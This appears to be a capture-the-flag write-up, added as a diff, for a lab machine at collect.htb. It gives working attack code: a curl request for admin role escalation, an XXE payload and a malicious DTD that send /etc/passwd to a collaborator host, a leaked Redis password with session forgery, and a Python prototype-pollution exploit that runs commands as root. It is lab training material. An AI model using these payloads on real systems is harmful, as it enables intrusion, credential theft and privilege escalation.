@@ -1,0 +1,101 @@
+this machine is all about ,cookies,creds and hacktrics
+
+we will use redis to update our cookie to admin , the n use mysql to update our cookie to get token .
+
+then we will use some cve from hacktricks to get root.txt
+
+3 ports were open 80 and redis
+
+redis needed creds but no creds we there
+
+on port 80  we found 2 other subdomains
+
+developes domain needed creds .. from fourm we found a file and a api which set user to admin
+
+we sent our cookie with token provided and became admin on port 80 website
+
+`curl --cookie "PHPSESSID=ejoc3ci871k94p40j94741u609" -d "token=ddac62a28254561001277727cb397baf" http://collect.htb/set/role/admin -v`
+
+now we can navigate to /admin , it had a login button which ask for username and pass
+
+when we looked it into burp .. it had manage_api-- xml  version 1.0 was being used and we can connect to our host with it
+
+if we sent `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`  in manage_api it connect to my pc
+
+so we created a mal.dtd file
+
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; test SYSTEM 'http://burp-collaborator/?a=%file;'>">
+%eval;
+%test;
+```
+
+and it sendt base64 of the file to our server
+
+file to look for  `../bootstrap.php , /var/www/developers/.htpasswd and /var/www/developers/index.php`
+
+we got developers cred to log in the subdomain (but not working) and redis creds too
+
+redis creds was like `AUTH COLLE$RPASWORD`
+
+we can update our cookie in redis to
+
+` SET "PHPREDIS_SESSION:9dac31rgvsjbnkp3h2sgeb42ho" "username|s:7:\"zolaboo\";auth|s:5:\"admin\";"`
+
+and now we can enter developers subdomain
+
+idk how but it exploitable to `https://github.com/synacktiv/php_filter_chain_generator`
+
+and got shell
+
+noew port 9000 was running internally fastcgi
+
+`https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi?ref=hacktrickz.xyz`
+
+used this payload to to get shell as other user now root part
+
+port 3000 was open internally
+
+and on mysql there was a database for pollution_api
+
+so it was exploitable for prototype pollution
+
+we logged in mysql and changed our user a to admin
+
+now we sent our user an password to port 3000 it gave token
+
+`curl http://127.0.0.1:3000/auth/login -H "content-type: application/json" -d '{"username":"test","password":"test"}'`
+
+```
+import requests 
+
+host = "http://127.0.0.1:3000/"
+
+loginData = {
+    "username": "zolaboo",
+    "password": "password"
+}
+res = requests.post(host +'auth/login', json=loginData )
+token = res.json().get("Header").get("x-access-token")
+
+payload = {
+    "text": "jees",
+    "gg": {
+        "__proto__": {
+            "shell": "/proc/self/exe",
+            "argv0": "console.log(require('child_process').execSync('cp /root/root.txt /home/victor/root.txt && chown victor:victor /home/victor/root.txt').toString())//",
+            "NODE_OPTIONS": "--require /proc/self/cmdline"
+        }
+    }
+}
+
+headers = {
+    "x-access-token": token
+}
+
+res = requests.post(host +'admin/messages/send', json=payload, headers=headers )
+print(res.text)
+```
+
+this code gave us root.txt
